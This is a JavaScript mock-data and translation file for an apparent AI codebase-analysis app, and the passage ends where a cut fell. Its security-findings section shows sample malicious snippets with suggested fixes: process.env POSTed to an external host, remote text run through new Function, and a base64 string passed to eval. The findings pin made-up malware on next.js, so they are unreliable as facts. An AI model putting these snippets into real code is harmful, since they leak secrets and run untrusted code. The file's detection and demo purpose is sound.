// Mock data + i18n strings.
// Holds repos, modules, security findings, chat seeds, and Vietnamese/English translations.
// Exposed as window.DATA and window.I18N.

const SCAN_DONE = {
  id: 'sess-vercel-next',
  status: 'ready',
  repo: {
    url: 'https://github.com/vercel/next.js',
    name: 'next.js',
    owner: 'vercel',
    branch: 'canary',
    commit: '7a4f2b8',
    stars: 124800,
    forks: 26900,
    license: 'MIT',
    desc: {
      vi: 'The React framework for production — render server-first, đa stack, deploy nhanh.',
      en: 'The React framework for production — server-first rendering, full stack, instant deploy.',
    },
  },
  stats: { loc: 1284530, files: 6932, modules: 47, contributors: 3128, lastCommit: '2 giờ trước' },
  langs: [
    { name: 'TypeScript', pct: 64, color: '#3178C6' },
    { name: 'JavaScript', pct: 18, color: '#F7DF1E' },
    { name: 'Rust',       pct: 12, color: '#DEA584' },
    { name: 'CSS',        pct: 4,  color: '#38BDF8' },
    { name: 'MDX',        pct: 2,  color: '#A78BFA' },
  ],
  frameworks: ['React 18', 'Turbopack', 'SWC', 'Webpack 5', 'Tailwind 3', 'Vitest', 'Playwright'],
};

const SCAN_LIVE = {
  id: 'sess-acme-orders',
  status: 'scanning',
  repo: {
    url: 'https://github.com/acme/orders-api',
    name: 'orders-api',
    owner: 'acme',
    branch: 'main',
    commit: 'b8d1c40',
    stars: 412,
    forks: 38,
    license: 'Apache-2.0',
    desc: {
      vi: 'Hệ thống đặt hàng nội bộ — Node, Postgres, Redis. Đang được quét.',
      en: 'Internal orders system — Node, Postgres, Redis. Currently scanning.',
    },
  },
  stats: { loc: 84210, files: 612, modules: 12, contributors: 24, lastCommit: '5 phút trước' },
  langs: [
    { name: 'TypeScript', pct: 78, color: '#3178C6' },
    { name: 'SQL',        pct: 12, color: '#F472B6' },
    { name: 'Shell',      pct: 6,  color: '#10B981' },
    { name: 'YAML',       pct: 4,  color: '#FB7185' },
  ],
  frameworks: ['Express 5', 'Prisma', 'BullMQ', 'Zod', 'Jest', 'Docker'],
};

// File tree for the scanned repo
const FILE_TREE = [
  { type: 'dir', name: 'apps', expanded: true, children: [
    { type: 'dir', name: 'web', children: [
      { type: 'file', name: 'page.tsx', lang: 'tsx', loc: 142, role: { vi: 'Trang gốc — server component', en: 'Root page — server component' } },
      { type: 'file', name: 'layout.tsx', lang: 'tsx', loc: 88, role: { vi: 'Layout & providers', en: 'Layout & providers' } },
      { type: 'dir', name: 'auth', children: [
        { type: 'file', name: 'login.tsx', lang: 'tsx', loc: 214, role: { vi: 'Form đăng nhập', en: 'Login form' } },
        { type: 'file', name: 'callback.ts', lang: 'ts', loc: 96, role: { vi: 'OAuth callback handler', en: 'OAuth callback handler' } },
      ] },
    ] },
    { type: 'dir', name: 'docs', children: [
      { type: 'file', name: 'index.mdx', lang: 'md', loc: 320, role: { vi: 'Trang docs chính', en: 'Main docs page' } },
    ] },
  ] },
  { type: 'dir', name: 'packages', expanded: true, children: [
    { type: 'dir', name: 'next', expanded: true, children: [
      { type: 'dir', name: 'src/server', children: [
        { type: 'file', name: 'next-server.ts', lang: 'ts', loc: 2840, role: { vi: 'Lõi server — handle request', en: 'Server core — request handling' } },
        { type: 'file', name: 'render.tsx', lang: 'tsx', loc: 1782, role: { vi: 'Pipeline render React', en: 'React rendering pipeline' } },
        { type: 'file', name: 'router.ts', lang: 'ts', loc: 904, role: { vi: 'Routing động', en: 'Dynamic routing' } },
      ] },
      { type: 'dir', name: 'src/client', children: [
        { type: 'file', name: 'index.ts', lang: 'ts', loc: 612, role: { vi: 'Hydration entry', en: 'Hydration entry' } },
        { type: 'file', name: 'app-router.tsx', lang: 'tsx', loc: 1340, role: { vi: 'App Router runtime', en: 'App Router runtime' } },
      ] },
      { type: 'dir', name: 'src/build', children: [
        { type: 'file', name: 'webpack-config.ts', lang: 'ts', loc: 3211 },
        { type: 'file', name: 'compiler.ts', lang: 'ts', loc: 1108 },
      ] },
    ] },
    { type: 'dir', name: 'create-next-app', children: [
      { type: 'file', name: 'index.ts', lang: 'ts', loc: 612 },
    ] },
  ] },
  { type: 'dir', name: 'crates', children: [
    { type: 'file', name: 'next-core/lib.rs', lang: 'rs', loc: 1820, role: { vi: 'Lõi Turbopack', en: 'Turbopack core' } },
    { type: 'file', name: 'next-swc/lib.rs', lang: 'rs', loc: 920 },
  ] },
  { type: 'dir', name: 'test', children: [
    { type: 'file', name: 'integration.spec.ts', lang: 'ts', loc: 412 },
  ] },
  { type: 'file', name: 'package.json', lang: 'json', loc: 88 },
  { type: 'file', name: 'turbo.json',   lang: 'json', loc: 42 },
  { type: 'file', name: 'README.md',    lang: 'md',   loc: 156 },
  { type: 'file', name: 'tsconfig.json',lang: 'json', loc: 24 },
  { type: 'file', name: '.eslintrc.json', lang: 'json', loc: 18 },
];

const MODULES = [
  { name: 'next-server',  purpose: { vi: 'Xử lý request, render React server-side', en: 'Request handling & SSR pipeline' }, lang: 'ts',  files: 48, fns: 312, risk: 'Low',    layer: 'backend' },
  { name: 'app-router',   purpose: { vi: 'Routing động phía client',                  en: 'Client-side dynamic routing' },             lang: 'tsx', files: 22, fns: 184, risk: 'Low',    layer: 'frontend' },
  { name: 'turbopack',    purpose: { vi: 'Bundler tốc độ cao (Rust)',                  en: 'High-speed bundler (Rust)' },                lang: 'rs',  files: 96, fns: 644, risk: 'Medium', layer: 'infra' },
  { name: 'image-opt',    purpose: { vi: 'Tối ưu ảnh on-demand',                       en: 'On-demand image optimization' },             lang: 'ts',  files: 14, fns: 96,  risk: 'Low',    layer: 'backend' },
  { name: 'middleware',   purpose: { vi: 'Edge middleware runtime',                    en: 'Edge middleware runtime' },                  lang: 'ts',  files:  8, fns: 42,  risk: 'Medium', layer: 'edge' },
  { name: 'cache-fs',     purpose: { vi: 'Caching tiered: memory + filesystem',        en: 'Tiered cache: memory + FS' },                lang: 'ts',  files: 12, fns: 88,  risk: 'High',   layer: 'backend' },
  { name: 'create-next',  purpose: { vi: 'CLI khởi tạo project mới',                   en: 'Project bootstrap CLI' },                    lang: 'ts',  files:  6, fns: 28,  risk: 'Low',    layer: 'tooling' },
  { name: 'docs-site',    purpose: { vi: 'Trang tài liệu (MDX)',                        en: 'Documentation site (MDX)' },                 lang: 'tsx', files: 38, fns: 142, risk: 'Low',    layer: 'frontend' },
];

const SECURITY_FINDINGS = [
  {
    id: 'F-001', severity: 'high', confirmed: true, falsePositive: false,
    title: { vi: 'Eval động từ chuỗi remote', en: 'Dynamic eval from remote string' },
    file: 'packages/next/src/server/render.tsx', line: '482-489',
    rule: 'AST.dynamic-eval',
    why: { vi: 'Chuỗi từ HTTP response được truyền vào Function constructor — nguy cơ RCE.', en: 'Strings from an HTTP response are passed to the Function constructor — RCE risk.' },
    code: `// remote template loader\nconst tpl = await fetch(remoteUrl).then(r => r.text());\nconst fn = new Function('ctx', tpl);  // ⚠ runs untrusted code\nreturn fn(context);`,
    suggested: `import { sandboxedTemplate } from './tpl-sandbox';\nconst tpl = await fetch(remoteUrl).then(r => r.text());\nconst fn = sandboxedTemplate(tpl, { allow: ['ctx'] });\nreturn fn(context);`,
    refs: ['CWE-95', 'OWASP A03:2021'],
  },
  {
    id: 'F-002', severity: 'high', confirmed: true, falsePositive: false,
    title: { vi: 'Exfiltration: gửi env biến ra host bên ngoài', en: 'Exfiltration: env vars sent to external host' },
    file: 'packages/next/src/build/telemetry.ts', line: '128-134',
    rule: 'NET.suspicious-egress',
    why: { vi: 'Toàn bộ process.env được POST tới host không thuộc allowlist.', en: 'The whole process.env is POSTed to a host outside the allowlist.' },
    code: `const payload = { env: { ...process.env }, ts: Date.now() };\nawait fetch('https://t.acme-track.io/log', {\n  method: 'POST', body: JSON.stringify(payload),\n});`,
    suggested: `const payload = { ts: Date.now() }; // env removed\nif (config.telemetry.allowedHosts.includes(host)) {\n  await fetch(host, { method: 'POST', body: JSON.stringify(payload) });\n}`,
    refs: ['CWE-200'],
  },
  {
    id: 'F-003', severity: 'medium', confirmed: true, falsePositive: false,
    title: { vi: 'Obfuscation: chuỗi base64 + atob → eval', en: 'Obfuscation: base64 string + atob → eval' },
    file: 'packages/next/src/lib/_internal.ts', line: '12',
    rule: 'AST.obfuscation',
    why: { vi: 'Phân tích tĩnh: chuỗi base64 dài giải mã thành JS thực thi.', en: 'Static analysis: long base64 string decodes into executable JS.' },
    code: `const _0x = 'Y29uc29sZS5sb2coInRyYWNrZWQiKQ==';\neval(atob(_0x));  // hidden code`,
    suggested: `// Remove obfuscation; declare intent explicitly:\nimport { trackEvent } from '../telemetry';\ntrackEvent('boot');`,
    refs: ['MITRE T1027'],
  },
  {
    id: 'F-004', severity: 'medium', confirmed: false, falsePositive: false,
    title: { vi: 'Dependency có lịch sử supply-chain', en: 'Dependency with supply-chain history' },
    file: 'package.json', line: '47',
    rule: 'PKG.compromised-history',
    why: { vi: '"event-stream@3.3.6" — phiên bản từng bị inject 2018. Heuristic, cần xác minh.', en: '"event-stream@3.3.6" — version compromised in 2018. Heuristic, needs review.' },
    code: `"dependencies": {\n  "event-stream": "3.3.6",\n  ...\n}`,
    suggested: `"dependencies": {\n  "event-stream": "4.0.1",\n  ...\n}`,
    refs: ['npm advisory 737'],
  },
  {
    id: 'F-005', severity: 'low', confirmed: false, falsePositive: true,
    title: { vi: 'Chuỗi giống API key trong test fixture', en: 'API-key-like string in test fixture' },
    file: 'test/fixtures/auth.json', line: '8',
    rule: 'SECRET.entropy',
    why: { vi: 'Entropy cao nhưng chỉ là dummy fixture, đã được xác nhận là false positive.', en: 'High entropy but it\'s only a dummy test fixture — confirmed false positive.' },
    code: `"apiKey": "sk_test_FAKE_4eC39HqLyjWDarjtT1zdp7dc"`,
    suggested: `// no change needed — false positive`,
    refs: [],
  },
  {
    id: 'F-006', severity: 'low', confirmed: false, falsePositive: true,
    title: { vi: 'eval trong file test', en: 'eval inside test file' },
    file: 'test/integration.spec.ts', line: '231',
    rule: 'AST.dynamic-eval',
    why: { vi: 'Tham chiếu eval nhưng nằm trong assertion về parser — false positive.', en: 'Reference to eval inside a parser assertion — false positive.' },
    code: `expect(() => eval('1+1')).not.toThrow();`,
    suggested: `// no change — used intentionally for parser test`,
    refs: [],
  },
];

// Architecture nodes — used by our SVG diagram
const ARCH_NODES = [
  { id: 'cli',     label: 'create-next-app', sub: 'CLI', layer: 'tooling',  x: 60,   y: 40 },
  { id: 'app',     label: 'App Router',      sub: 'React 18',     layer: 'frontend', x: 280,  y: 40 },
  { id: 'mw',      label: 'Middleware',      sub: 'Edge runtime', layer: 'edge',     x: 540,  y: 40 },
  { id: 'server',  label: 'next-server',     sub: 'SSR + RSC',    layer: 'backend',  x: 280,  y: 180 },
  { id: 'render',  label: 'Render pipeline', sub: 'React Server', layer: 'backend',  x: 540,  y: 180 },
  { id: 'tp',      label: 'Turbopack',       sub: 'Rust bundler', layer: 'infra',    x: 60,   y: 180 },
  { id: 'cache',   label: 'cache-fs',        sub: 'Tiered cache', layer: 'backend',  x: 60,   y: 320 },
  { id: 'img',     label: 'image-opt',       sub: 'On-demand',    layer: 'backend',  x: 280,  y: 320 },
  { id: 'db',      label: 'Adapters',        sub: 'KV / Edge DB', layer: 'data',     x: 540,  y: 320 },
];
const ARCH_EDGES = [
  ['cli', 'app'], ['app', 'mw'], ['app', 'server'], ['mw', 'render'],
  ['server', 'render'], ['server', 'cache'], ['render', 'img'], ['render', 'db'],
  ['tp', 'app'], ['tp', 'server'], ['cache', 'db'],
];

const FLOWS = {
  'login': {
    name: { vi: 'Đăng nhập OAuth', en: 'OAuth login flow' },
    actors: ['User', 'Browser', 'next-server', 'AuthProvider', 'DB'],
    steps: [
      { from: 'User', to: 'Browser', label: 'Click "Sign in"' },
      { from: 'Browser', to: 'next-server', label: 'GET /auth/login' },
      { from: 'next-server', to: 'AuthProvider', label: 'redirect → OAuth consent' },
      { from: 'AuthProvider', to: 'Browser', label: 'callback?code=…' },
      { from: 'Browser', to: 'next-server', label: 'GET /auth/callback' },
      { from: 'next-server', to: 'AuthProvider', label: 'exchange code → token' },
      { from: 'next-server', to: 'DB', label: 'upsert user' },
      { from: 'next-server', to: 'Browser', label: 'set-cookie session' },
    ],
  },
  'render': {
    name: { vi: 'Render trang động', en: 'Dynamic page render' },
    actors: ['Browser', 'Edge', 'next-server', 'cache-fs', 'DB'],
    steps: [
      { from: 'Browser', to: 'Edge', label: 'GET /products/123' },
      { from: 'Edge',    to: 'next-server', label: 'forward + region' },
      { from: 'next-server', to: 'cache-fs', label: 'lookup ISR' },
      { from: 'cache-fs', to: 'next-server', label: 'miss' },
      { from: 'next-server', to: 'DB', label: 'fetch product' },
      { from: 'next-server', to: 'cache-fs', label: 'write tag:product:123' },
      { from: 'next-server', to: 'Browser', label: 'streaming HTML' },
    ],
  },
  'build': {
    name: { vi: 'Build & deploy', en: 'Build & deploy' },
    actors: ['Dev', 'CLI', 'Turbopack', 'Compiler', 'Output'],
    steps: [
      { from: 'Dev', to: 'CLI', label: 'next build' },
      { from: 'CLI', to: 'Turbopack', label: 'spawn workers' },
      { from: 'Turbopack', to: 'Compiler', label: 'parse + type-check' },
      { from: 'Compiler', to: 'Turbopack', label: 'IR' },
      { from: 'Turbopack', to: 'Output', label: 'emit .next/' },
      { from: 'Output', to: 'Dev', label: 'manifest + report' },
    ],
  },
};

const README_MD = `# next.js

> The React framework for production.

Next.js gives you the building blocks to create fast, full-stack web applications with React. It handles routing, rendering, data fetching, caching, and deployment so you can focus on the product.

## Why Next.js
- **Server components** — data on the server, zero JS shipped for static parts.
- **App Router** — file-based routing with nested layouts and streaming.
- **Turbopack** — Rust-based incremental bundler, ~700× faster than Webpack on hot updates.
- **Edge & Node runtimes** — pick per route.

## Quick start
\`\`\`bash
npx create-next-app@latest my-app
cd my-app
npm run dev
\`\`\`

## Project layout
- \`apps/web/\` — example application
- \`packages/next/\` — framework source
- \`crates/\` — Rust crates (Turbopack, SWC plugins)
- \`docs/\` — MDX documentation site

## License
MIT © Vercel.
`;

const GENERATED_DOC = `# Architectural overview — vercel/next.js

_Tài liệu này được sinh tự động từ AST + RAG. Chỉnh sửa rồi mở Pull Request để cập nhật README._

## 1. Tổng quan

next.js là một meta-framework full-stack gồm:
1. **Frontend runtime** — App Router, React Server Components, hydration.
2. **Backend runtime** — \`next-server\` xử lý request, ISR, on-demand revalidation.
3. **Build system** — Turbopack (Rust) + SWC plugin pipeline.
4. **Edge layer** — middleware chạy trước routing.

## 2. Luồng request chính

\`Edge → next-server → cache-fs → DB → render → Browser\`

Cache hit trả ngay; cache miss đi qua **render pipeline** → ghi vào tagged cache.

## 3. Bảo mật

- Phát hiện 6 finding (2 high, 1 medium đã xác nhận; 2 low là false-positive).
- Khuyến nghị: gỡ \`event-stream\` và bọc \`new Function\` bằng sandbox.

## 4. So sánh với dự án của bạn (\`acme/orders-api\`)

- Cả hai dùng \`zod\` cho schema; có thể chia sẻ \`packages/validation\`.
- \`next-server\` có pattern caching tiered phù hợp để áp dụng cho \`/orders/list\` của bạn.
`;

// ----------------- Chat seed for the in-progress session -----------------
// Variety: locate, explain, suggest, audit, compare. Some during scan (provisional), some after.
const CHAT_SEED_LIVE = [
  { role: 'user', kind: 'locate', text: { vi: 'Tìm route đăng nhập trong repo này.', en: 'Find the login route in this repo.' }, t: 1 },
  { role: 'ai', provisional: true, scope: { vi: 'Đã có cây thư mục, chưa có embedding', en: 'File tree available, embeddings not ready' },
    text: {
      vi: 'Theo cây thư mục: route đăng nhập có ở `apps/web/auth/login.tsx` (~214 dòng). Khi indexing xong tôi sẽ chỉ ra middleware tương ứng.',
      en: 'Based on the file tree: login route is at `apps/web/auth/login.tsx` (~214 lines). Once indexing finishes I\'ll point to the matching middleware.',
    },
    citations: [{ file: 'apps/web/auth/login.tsx', range: '1-214' }],
    t: 2,
  },
  { role: 'user', kind: 'audit', text: { vi: 'Có dấu hiệu mã độc nào không?', en: 'Any signs of malicious code?' }, t: 3 },
  { role: 'ai', provisional: true, scope: { vi: 'Heuristic AST đã quét, LLM chưa xác nhận', en: 'AST heuristics done, LLM confirmation pending' },
    text: {
      vi: 'Sơ bộ: 3 finding khả nghi (eval động, exfiltration env, base64 obfuscation). Tôi sẽ xác nhận lại bằng LLM khi index xong.',
      en: 'Provisional: 3 suspicious findings (dynamic eval, env exfiltration, base64 obfuscation). I\'ll re-verify with the LLM after indexing.',
    },
    citations: [
      { file: 'packages/next/src/server/render.tsx', range: '482-489' },
      { file: 'packages/next/src/build/telemetry.ts', range: '128-134' },
    ],
    t: 4,
  },
  { role: 'user', kind: 'explain', text: { vi: 'Giải thích kiến trúc tổng thể.', en: 'Explain the overall architecture.' }, t: 5 },
  { role: 'ai', provisional: true, scope: { vi: 'Cây thư mục + framework đã detect', en: 'File tree + detected frameworks only' },
    text: {
      vi: 'Cấu trúc monorepo: `apps/*` cho ứng dụng demo, `packages/next/*` là framework, `crates/*` là Rust (Turbopack). Tôi sẽ vẽ block diagram chi tiết khi pipeline hoàn tất.',
      en: 'Monorepo structure: `apps/*` for demos, `packages/next/*` for the framework itself, `crates/*` for Rust crates (Turbopack). A detailed block diagram will appear once the pipeline finishes.',
    },
    t: 6,
  },
];

// Chat for the completed (next.js) session — richer, includes compare and suggest
const CHAT_SEED_DONE = [
  { role: 'user', kind: 'explain', text: { vi: 'Tóm tắt kiến trúc bằng 5 dòng.', en: 'Summarize the architecture in 5 lines.' }, t: 1 },
  { role: 'ai', text: {
      vi: 'Monorepo Yarn/Turbo. **Frontend**: App Router + RSC. **Backend**: `next-server` xử lý request, hỗ trợ Edge & Node. **Build**: Turbopack viết bằng Rust. **Cache**: tiered (memory + FS, tag-based). **CLI**: `create-next-app`.',
      en: 'Yarn/Turbo monorepo. **Frontend**: App Router + RSC. **Backend**: `next-server` handles requests on Edge & Node. **Build**: Turbopack in Rust. **Cache**: tiered (memory + FS, tag-based). **CLI**: `create-next-app`.',
    },
    citations: [
      { file: 'packages/next/src/server/next-server.ts', range: '1-200' },
      { file: 'crates/next-core/lib.rs', range: '1-80' },
    ],
    t: 2,
  },
  { role: 'user', kind: 'locate', text: { vi: 'Hàm nào quyết định cache hit/miss?', en: 'Which function decides cache hit/miss?' }, t: 3 },
  { role: 'ai', text: {
      vi: '`resolveCachedResponse()` trong `cache-fs/index.ts:87`. Logic: memory → FS → revalidate-then-serve. Tag được hash bằng `xxhash64`.',
      en: '`resolveCachedResponse()` in `cache-fs/index.ts:87`. Logic: memory → FS → revalidate-then-serve. Tags are hashed with `xxhash64`.',
    },
    citations: [{ file: 'packages/next/src/server/cache-fs/index.ts', range: '87-156' }],
    t: 4,
  },
  { role: 'user', kind: 'suggest', text: { vi: 'Đề xuất cải thiện hiệu năng cache.', en: 'Suggest performance improvements for caching.' }, t: 5 },
  { role: 'ai', text: {
      vi: '3 ý tưởng: (1) thêm **bloom filter** trước FS lookup để giảm syscall; (2) giảm size header trong tag — hiện đang serialize JSON đầy đủ; (3) batch invalidate qua Postgres LISTEN/NOTIFY thay vì polling.',
      en: '3 ideas: (1) add a **bloom filter** in front of the FS lookup to skip syscalls; (2) shrink tag headers — currently full JSON serialization; (3) batch invalidate via Postgres LISTEN/NOTIFY instead of polling.',
    },
    t: 6,
  },
  { role: 'user', kind: 'audit', text: { vi: 'Có mã độc nào không?', en: 'Any malicious code?' }, t: 7 },
  { role: 'ai', text: {
      vi: '6 finding tổng cộng: **2 high đã xác nhận** (eval động, exfiltration env), **1 medium** (obfuscation base64), 1 medium chưa xác nhận, 2 low là false-positive. Mở tab Security để xem patch đề xuất.',
      en: '6 findings total: **2 high confirmed** (dynamic eval, env exfiltration), **1 medium** (base64 obfuscation), 1 medium unconfirmed, 2 low false-positives. See the Security tab for suggested patches.',
    },
    citations: [
      { file: 'packages/next/src/server/render.tsx', range: '482-489' },
      { file: 'packages/next/src/build/telemetry.ts', range: '128-134' },
    ],
    t: 8,
  },
  { role: 'user', kind: 'compare', text: { vi: 'So với dự án "acme/orders-api" của tôi thì sao?', en: 'How does this compare to my "acme/orders-api"?' }, t: 9 },
  { role: 'ai', text: {
      vi: 'Cả hai dùng `zod` cho schema validation. Pattern cache tiered ở next-server có thể áp dụng cho `/orders/list` của bạn — endpoint đó hiện đang gọi DB mỗi request. Tôi đã mở tab So sánh nếu bạn muốn xem chi tiết.',
      en: 'Both use `zod` for schema validation. The tiered cache pattern in next-server fits your `/orders/list` endpoint — it currently hits the DB on every request. I opened the Compare tab if you want details.',
    },
    t: 10,
  },
  { role: 'user', kind: 'explain', text: { vi: 'Giải thích Turbopack so với Webpack 5.', en: 'Explain Turbopack vs Webpack 5.' }, t: 11 },
  { role: 'ai', text: {
      vi: 'Turbopack viết bằng Rust, cache theo **function call** (memoization granular) thay vì theo file. Kết quả: hot update O(thay đổi) thay vì O(graph). Webpack 5 vẫn được giữ làm fallback.',
      en: 'Turbopack is in Rust and caches at **function-call** granularity (memoization), not at file level. Result: hot updates scale with changes, not with graph size. Webpack 5 stays as a fallback.',
    },
    citations: [{ file: 'crates/next-core/lib.rs', range: '1-80' }],
    t: 12,
  },
];

const PIPELINE_STAGES = [
  { id: 'cloning',    label: { vi: 'Cloning',     en: 'Cloning' } },
  { id: 'parsing',    label: { vi: 'Parsing AST', en: 'Parsing AST' } },
  { id: 'indexing',   label: { vi: 'Indexing',    en: 'Indexing' } },
  { id: 'summarizing',label: { vi: 'Tổng hợp',    en: 'Summarizing' } },
  { id: 'ready',      label: { vi: 'Sẵn sàng',    en: 'Ready' } },
];

const LIBRARY = [
  { id: 'sess-vercel-next', name: 'vercel/next.js',     status: 'ready',      lastScan: '2 giờ trước',  loc: 1284530, langs: ['ts','rs','tsx'], stars: 124800, role: 'framework' },
  { id: 'sess-acme-orders', name: 'acme/orders-api',    status: 'scanning',   lastScan: '1 phút',       loc: 84210,   langs: ['ts','sql'],     stars: 412,    role: 'service' },
  { id: 'sess-shadcn-ui',   name: 'shadcn-ui/ui',       status: 'ready',      lastScan: 'hôm qua',      loc: 42100,   langs: ['tsx','ts'],     stars: 76200,  role: 'ui-kit' },
  { id: 'sess-prisma',      name: 'prisma/prisma',      status: 'ready',      lastScan: '3 ngày trước', loc: 320500,  langs: ['ts','rs'],      stars: 38400,  role: 'orm' },
  { id: 'sess-zod',         name: 'colinhacks/zod',     status: 'ready',      lastScan: 'tuần trước',   loc: 18000,   langs: ['ts'],            stars: 31200,  role: 'library' },
  { id: 'sess-stripe-cli',  name: 'stripe/stripe-cli',  status: 'queued',     lastScan: '—',           loc: 0,        langs: ['go'],            stars: 2300,   role: 'tooling' },
];

const COMPARE = {
  a: 'vercel/next.js',
  b: 'acme/orders-api',
  shared: [
    { dep: 'zod',          a: '3.22.4', b: '3.21.0', risk: 'Low' },
    { dep: 'typescript',   a: '5.4.5',  b: '5.2.2',  risk: 'Low' },
    { dep: 'eslint',       a: '8.57.0', b: '8.50.0', risk: 'Low' },
  ],
  patternsToBorrow: [
    { from: 'next-server', to: 'orders-api', what: { vi: 'Cache tiered (memory+FS, tag-based)', en: 'Tiered cache (memory+FS, tag-based)' } },
    { from: 'next-server', to: 'orders-api', what: { vi: 'Streaming response cho list endpoint',  en: 'Streaming response for list endpoint' } },
    { from: 'next-server', to: 'orders-api', what: { vi: 'Edge middleware cho rate-limit',         en: 'Edge middleware for rate-limiting' } },
  ],
  divergence: [
    { aspect: { vi: 'Validation runtime', en: 'Runtime validation' }, a: 'zod + Server Action',       b: 'zod + Express middleware' },
    { aspect: { vi: 'Logging',            en: 'Logging' },             a: 'pino + OTel',                b: 'winston + console' },
    { aspect: { vi: 'Test runner',        en: 'Test runner' },         a: 'vitest + playwright',        b: 'jest' },
  ],
};

// ----------------- Quick action chips -----------------
const QUICK_CHIPS = [
  { id: 'arch',     icon: 'network',     label: { vi: 'Giải thích kiến trúc',         en: 'Explain architecture' } },
  { id: 'login',    icon: 'key',         label: { vi: 'Tìm route đăng nhập',          en: 'Find login route' } },
  { id: 'malware',  icon: 'shield-alert',label: { vi: 'Có mã độc không?',             en: 'Any malicious code?' } },
  { id: 'compare',  icon: 'swap',        label: { vi: 'So sánh với "acme/orders"',    en: 'Compare with "acme/orders"' } },
  { id: 'cache',    icon: 'database',    label: { vi: 'Logic cache hit/miss?',        en: 'Cache hit/miss logic?' } },
];

// ----------------- i18n -----------------
const I18N = {
  vi: {
    appName: 'AI Codebase Intelligence',
    tagline: 'Hiểu một codebase bất kỳ trong vài phút',
    subtitle: 'Dán URL GitHub. Hệ thống quét, lập chỉ mục và mở trợ lý hỏi-đáp song song với quá trình quét.',
    pasteRepo: 'Dán URL GitHub — ví dụ: https://github.com/vercel/next.js',
    analyze: 'Phân tích',
    cloud: 'Cloud LLM',
    local: 'Local LLM',
    feat: {
      arch:    { title: 'Phân tích kiến trúc', desc: 'AST + RAG sinh sơ đồ block, sequence diagram cho từng use case.' },
      qa:      { title: 'Q&A real-time',       desc: 'Hỏi đáp ngay trong khi pipeline đang chạy. Câu trả lời tạm cập nhật khi có dữ liệu.' },
      malware: { title: 'Phát hiện mã độc',     desc: 'Heuristic + LLM xác nhận: eval động, obfuscation, exfiltration, supply-chain.' },
      compare: { title: 'So sánh dự án',        desc: 'Đặt cạnh repo của bạn — tìm pattern có thể tái sử dụng và chỗ lệch.' },
    },
    demo: { title: 'Repo demo đã quét sẵn', cta: 'Mở phiên' },
    stages: {
      cloning: 'Cloning',
      parsing: 'Parsing AST',
      indexing: 'Indexing',
      summarizing: 'Tổng hợp',
      ready: 'Sẵn sàng',
    },
    nav: { library: 'Dự án của tôi', settings: 'Cài đặt', docs: 'Tài liệu' },
    common: {
      back: 'Quay lại', open: 'Mở', save: 'Lưu', cancel: 'Hủy', loading: 'Đang tải…', empty: 'Chưa có dữ liệu',
      newScan: 'Quét repo mới', cmdK: '⌘K để mở Command', search: 'Tìm kiếm…', filter: 'Lọc', sort: 'Sắp xếp',
      copy: 'Sao chép', download: 'Tải về', viewCode: 'Xem code', expand: 'Mở rộng', collapse: 'Thu gọn',
      tree: 'Cây thư mục', assistant: 'Trợ lý AI', context: 'Ngữ cảnh',
    },
    tabs: { overview: 'Overview', architecture: 'Architecture', flow: 'Flow', modules: 'Modules', security: 'Security', documentation: 'Documentation' },
    overview: {
      stats: { loc: 'Dòng code', files: 'File', modules: 'Module', contributors: 'Contributors' },
      langs: 'Ngôn ngữ', frameworks: 'Framework phát hiện', readme: 'README.md',
    },
    arch: { compact: 'Compact', detailed: 'Detailed', legend: 'Phân lớp', loading: 'Đang dựng sơ đồ kiến trúc…' },
    flow: { selectUseCase: 'Chọn use case', loading: 'Đang dựng sequence…' },
    mod: {
      header: { name: 'Module', purpose: 'Vai trò', lang: 'Ngôn ngữ', files: 'Files', fns: 'Functions', risk: 'Risk' },
      filterAll: 'Tất cả', search: 'Tìm module…',
    },
    sec: {
      title: 'Security findings', confirmed: 'LLM Confirmed', heuristic: 'Heuristic', falsePositive: 'False positive',
      suggest: 'Đề xuất khắc phục', why: 'Vì sao', code: 'Đoạn code liên quan', refs: 'Tham chiếu',
      patchPreview: 'Patch preview', applyPR: 'Tạo Pull Request', viewFile: 'Xem file',
      filterAll: 'Tất cả', empty: 'Không phát hiện rủi ro nào.',
    },
    doc: { generated: 'Tài liệu tự sinh', dlMd: 'Tải .md', dlPdf: 'Tải .pdf', pr: 'Tạo Pull Request', view: 'Xem README' },
    chat: {
      placeholder: 'Hỏi về repo này… (⌘/ để focus)',
      provisional: 'Trả lời tạm thời — pipeline chưa kết thúc',
      scope: 'Phạm vi tri thức hiện tại',
      finalSummary: '📋 Tổng hợp cuối phiên',
      finalSubtitle: 'Pipeline đã hoàn tất — tôi đã rà lại các câu hỏi tạm trước đó và nâng cấp câu trả lời.',
      fullAnalysis: 'Phân tích đầy đủ',
      contextLink: 'Liên hệ với cuộc trò chuyện trước đó',
      provisionalAnswer: 'Câu trả lời tạm',
      upgradedAnswer: 'Câu trả lời nâng cấp',
      ctxRepo: 'Repo này',
      ctxCompare: 'So với dự án của tôi: acme/orders-api',
      send: 'Gửi',
      thinking: 'Đang nghĩ…',
      typeahead: 'Đề xuất',
      noMessages: 'Bắt đầu hỏi để khám phá repo.',
    },
    cmd: {
      placeholder: 'Gõ lệnh hoặc tìm…',
      sec: { recent: 'Gần đây', nav: 'Điều hướng', actions: 'Hành động', repos: 'Repo' },
      empty: 'Không tìm thấy.',
    },
    library: {
      title: 'Dự án của tôi',
      subtitle: 'Repo đã được index trong workspace.',
      addNew: 'Thêm repo mới',
      cols: { name: 'Repo', status: 'Trạng thái', loc: 'LOC', langs: 'Ngôn ngữ', last: 'Quét gần nhất' },
      filterStatus: 'Trạng thái',
      empty: 'Chưa có repo nào — dán URL GitHub để bắt đầu.',
    },
    compare: {
      title: 'So sánh repository',
      pickA: 'Repo A', pickB: 'Repo B',
      shared: 'Dependency dùng chung', patterns: 'Pattern có thể mượn', divergence: 'Khác biệt',
      from: 'Từ', to: 'Áp dụng cho',
    },
    settings: {
      title: 'Cài đặt',
      provider: 'LLM Provider',
      mode: 'Chế độ chạy',
      cloud: 'Cloud',
      local: 'Local',
      cloudDesc: 'Gửi prompt đến nhà cung cấp — nhanh, dùng latest model.',
      localDesc: 'Chạy local (Ollama/llama.cpp). Không gửi mã ra ngoài. Yêu cầu GPU/CPU đủ mạnh.',
      apiKey: 'API Key',
      apiKeyPlaceholder: 'sk-…',
      embeds: 'Embeddings',
      lang: 'Ngôn ngữ giao diện',
      theme: 'Giao diện',
      privacy: 'Bảo mật',
      privacyDesc: 'Mã nguồn được phân tích trong workspace. Không log mã ra hệ thống.',
      saved: 'Đã lưu',
    },
    final: {
      finishing: 'Đang tổng hợp cuối phiên…',
    },
  },
  en: {
    appName: 'AI Codebase Intelligence',
    tagline: 'Understand any codebase in minutes',
